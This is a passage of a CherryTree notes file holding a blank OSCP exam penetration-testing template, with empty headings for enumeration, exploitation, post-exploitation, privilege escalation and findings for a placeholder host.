Exploit POC:</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Description</rich_text>
        <rich_text>: 

</rich_text>
        <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
        <rich_text>






</rich_text>
        <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
        <rich_text>







</rich_text>
        <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
        <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
      </node>
      <node unique_id="235" master_id="0" name="Findings" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
        <node unique_id="236" master_id="0" name="Hashes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
        <node unique_id="237" master_id="0" name="Passwords" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
        <node unique_id="238" master_id="0" name="Proof\Flags\Other" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
      </node>
      <node unique_id="239" master_id="0" name="Software Versions" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="12" is_bold="0" foreground="" ts_creation="1670983937" ts_lastsave="1670983937">
        <rich_text underline="single" weight="heavy">Software Versions
</rich_text>
        <rich_text>





</rich_text>
        <rich_text underline="single" weight="heavy">Potential Exploits</rich_text>
      </node>
      <node unique_id="240" master_id="0" name="Log Book" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="1670983937" ts_lastsave="1670983937"/>
    </node>
    <node unique_id="241" master_id="0" name="127.0.0.3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="103" is_bold="1" foreground="" ts_creation="1670983939" ts_lastsave="1670983946">
      <node unique_id="242" master_id="0" name="Enumeration" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
        <node unique_id="243" master_id="0" name="TCP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
        <node unique_id="244" master_id="0" name="UDP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
        <node unique_id="245" master_id="0" name="Web Services" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="17" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <node unique_id="246" master_id="0" name="Nikto" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
          <node unique_id="247" master_id="0" name="Dirb\DirBuster" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
          <node unique_id="248" master_id="0" name="WebDav" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
          <node unique_id="249" master_id="0" name="CMS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
        </node>
        <node unique_id="250" master_id="0" name="Other Services" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="44" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <node unique_id="251" master_id="0" name="SMB" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
          <node unique_id="252" master_id="0" name="SNMP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
          <node unique_id="253" master_id="0" name="DB" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
          <node unique_id="254" master_id="0" name="Other" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
        </node>
      </node>
      <node unique_id="255" master_id="0" name="Exploitation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
        <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Description</rich_text>
        <rich_text>: 



</rich_text>
        <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
        <rich_text>






</rich_text>
        <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
        <rich_text>







</rich_text>
        <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
        <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
      </node>
      <node unique_id="256" master_id="0" name="Post Exploitation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
        <node unique_id="257" master_id="0" name="Script Results" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="44" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
        <node unique_id="258" master_id="0" name="Host Information" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <rich_text underline="single" weight="heavy">Operating System</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Architecture</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Domain</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Installed Updates</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node unique_id="259" master_id="0" name="File System" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <rich_text underline="single" weight="heavy">Writeable Files\Directories</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Directory List</rich_text>
          <rich_text>




</rich_text>
        </node>
        <node unique_id="260" master_id="0" name="Running Processes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <rich_text underline="single" weight="heavy">Process List</rich_text>
        </node>
        <node unique_id="261" master_id="0" name="Installed Applications" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <rich_text underline="single" weight="heavy">Installed Applications</rich_text>
        </node>
        <node unique_id="262" master_id="0" name="Users &amp; Groups" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <rich_text underline="single" weight="heavy">Users</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">Groups</rich_text>
        </node>
        <node unique_id="263" master_id="0" name="Network" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <rich_text underline="single" weight="heavy">IPConfig\IFConfig
</rich_text>
          <rich_text>



</rich_text>
          <rich_text underline="single" weight="heavy">Network Processes</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">ARP</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">DNS</rich_text>
          <rich_text>




</rich_text>
          <rich_text underline="single" weight="heavy">Route</rich_text>
        </node>
        <node unique_id="264" master_id="0" name="Scheduled Jobs" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
          <rich_text underline="single" weight="heavy">Scheduled Tasks</rich_text>
        </node>
      </node>
      <node unique_id="265" master_id="0" name="Priv Escalation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
        <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Description</rich_text>
        <rich_text>: 

</rich_text>
        <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
        <rich_text>






</rich_text>
        <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
        <rich_text>







</rich_text>
        <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
        <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
      </node>
      <node unique_id="266" master_id="0" name="Findings" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
        <node unique_id="267" master_id="0" name="Hashes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
        <node unique_id="268" master_id="0" name="Passwords" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
        <node unique_id="269" master_id="0" name="Proof\Flags\Other" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
      </node>
      <node unique_id="270" master_id="0" name="Software Versions" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="12" is_bold="0" foreground="" ts_creation="1670983939" ts_lastsave="1670983939">
        <rich_text underline="single" weight="heavy">Software Versions
</rich_text>
        <rich_text>





</rich_text>
        <rich_text underline="single" weight="heavy">Potential Exploits</rich_text>
      </node>
      <node unique_id="271" master_id="0" name="Log Book" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="1670983939" ts_lastsave="1670983939"/>
    </node>
  </node>
  <node unique_id="276" master_id="0" name="Cap" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724254755" ts_lastsave="1724256367">
    <rich_text>

</rich_text>
    <encoded_png char_offset="0" justification="left" link=""></encoded_png>
    <encoded_png char_offset="3" justification="left" link=""></encoded_png>
  </node>
</cherrytree>
